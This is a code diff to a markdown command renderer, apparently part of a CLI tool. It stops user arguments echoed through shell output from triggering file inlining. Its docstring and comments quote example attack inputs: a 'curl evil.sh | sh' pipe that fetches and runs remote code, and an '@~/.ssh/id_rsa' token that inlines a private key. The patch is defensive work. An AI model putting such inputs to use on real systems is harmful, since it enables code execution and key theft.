@@ -14,7 +14,9 @@ the arguments went in first, the text was re-scanned by the two token
 substitutions that follow it, so ``/review x !`curl evil.sh | sh```
 reached ``/bin/sh -c`` and ``/review @~/.ssh/id_rsa`` inlined the
 key. Expanding the template first means the only shell that ever
-runs is the one the command file itself wrote.
+runs is the one the command file itself wrote. A shell command that is
+handed the arguments can still print them back, so its output is kept
+out of the ``@path`` pass too: the arguments never inline a file.
 
 The renderer owns the two paths every substitution resolves against:
 the command file it came from, and the project it is being rendered
@@ -44,6 +46,10 @@ _SHELL_TOKEN_RE = re.compile(r"!`([^`\n]+)`")
 _AT_FILE_RE = re.compile(r"@([^\s)]+)")
 
 #: What a ``!`cmd``` token becomes in an untrusted folder's command.
+#: Stands in for ``@`` in the output of a shell command that was handed the
+#: arguments, so the @path pass skips it; a private-use character no file holds.
+_HELD_AT = "\ue000at\ue000"
+
 _UNTRUSTED_SHELL_MARKER = "[shell command not run: this folder is not trusted — see `igni trust`]"
 
 # How long any single shell substitution can run before we bail and
@@ -77,7 +83,7 @@ class MarkdownCommandRenderer:
         else:
             text = _SHELL_TOKEN_RE.sub(_UNTRUSTED_SHELL_MARKER, body)
         text = self._substitute_files(text)
-        return text.replace("$ARGUMENTS", args)
+        return text.replace(_HELD_AT, "@").replace("$ARGUMENTS", args)
 
     # ── Shell tokens ────────────────────────────────────────────
 
@@ -105,6 +111,14 @@ class MarkdownCommandRenderer:
             *(self._run_shell(self._inject_args(m.group(1), args), cwd=cwd) for m in matches),
             return_exceptions=False,
         )
+        # A command handed the arguments can print them back, and the @path pass
+        # would then inline whatever file they name: ``!`echo $ARGUMENTS``` with
+        # ``@~/.ssh/id_rsa``. The arguments never inline a file, so that output's
+        # @ is held back from the pass and restored after it.
+        results = [
+            out.replace("@", _HELD_AT) if "$ARGUMENTS" in m.group(1) else out
+            for m, out in zip(matches, results, strict=True)
+        ]
         # ``re.sub`` calls ``replace`` in match order, so a single-
         # pass iterator over ``results`` returns each captured stdout
         # to the correct token without an O(N) start-offset scan.
